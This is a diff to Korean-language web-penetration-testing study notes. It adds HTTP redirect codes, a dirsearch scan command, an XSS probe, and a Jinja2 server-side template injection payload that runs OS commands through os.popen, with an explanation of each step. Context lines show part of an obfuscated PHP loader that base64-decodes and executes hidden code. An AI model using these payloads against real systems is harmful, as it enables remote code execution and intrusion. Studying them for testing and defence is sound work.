@@ -15,6 +15,11 @@ mathjax_autoNumber: true
 1. /.well-known/
 1. Check also comments in the main and secondary pages.
 
+# 300 Error
+1. 301 Moved Permanently
+1. 302 Found
+1. 304 Not Modified
+
 # 400 Error
 1. 400 Bad Request로써, 요청 실패-문법상 오류가 있어서 서버가 요청 사항을 이해하지 못함
 1. 401 Unauthorized, 이 요청은 인증이 필요하다. 서버는 로그인이 필요한 페이지에 대해 이 요청을 제공할 수 있다. 상태 코드 이름이 권한 없음(Unauthorized)으로 되어 있지만 실제 뜻은 인증 안됨(Unauthenticated)에 더 가깝다.
@@ -40,6 +45,23 @@ $create_function = $strreplace("cgs1","","create_function");
 $safm1 = $create_function('', $base64_decode($base64_decode($str_replace("#;*,.", "", $oskl2.$gkst3.$hbkw1.$rcxh1))));
 $safm1();
 ?>
+
+## dirsearch
+* python3 dirsearch -u http://xxx.com:4514
+ 
+## XSS 공격
+* url 뒤에 abc.com/<img src=x onerror="alert('xss')"> 을 넣어서 xss 확인을 해볼 수 있다.
+
+## Flask/Jinja 관련 공격
+* 우선 {{3*'6'}}와 같은 방식으로 넣었을 때 숫자로 결과가 나오면 Twig이고 3이 6번 나오면 Jinja2이다. 
+* 아래 코드로 공격을 시도한다. 
+```
+{{"".__class__.__mro__[1].__subclasses__()[186].__init__.__globals__["__builtins__"]["__import__"]("os").popen("ls").read()}}
+```
+* MRO(Method Resolution Order)은 파이썬에 있는 classes의 hierarchy안에 있는 method를 보여주는 역할을 한다. 위에서 __mro__가 그 역할을 하고 첫번째 것을 보겠다는 것이다.
+* \__maro__\[1]은 object 클래스에 관한 것이다.
+* \__subclasses__()\[186]은 class warnings.catch_warnings이다.
+* 뒤에 os까지에는 모듈 os가 작동된다. 이후에 popen을 통해 os의 명령어를 실행한다. 마지막 read를 통해 그 안의 명령어 실행 결과를 읽는다.
 
 ## References
 * https://book.hacktricks.xyz/pentesting/pentesting-web[https://book.hacktricks.xyz/pentesting/pentesting-web]
